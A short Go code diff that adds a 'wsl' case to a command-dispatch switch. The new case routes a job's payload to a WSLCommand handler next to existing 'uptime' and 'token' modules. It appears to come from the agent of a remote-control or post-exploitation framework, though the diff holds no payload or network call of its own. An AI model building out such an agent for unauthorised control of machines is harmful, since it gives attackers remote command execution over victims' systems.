@@ -390,6 +390,8 @@ func execute() {
 					result = commands.Uptime()
 				case "token":
 					result = commands.Token(job.Payload.(jobs.Command))
+				case "wsl":
+					result = commands.WSLCommand(job.Payload.(jobs.Command))
 				default:
 					result.Stderr = fmt.Sprintf("unknown module command: %s", job.Payload.(jobs.Command).Command)
 				}
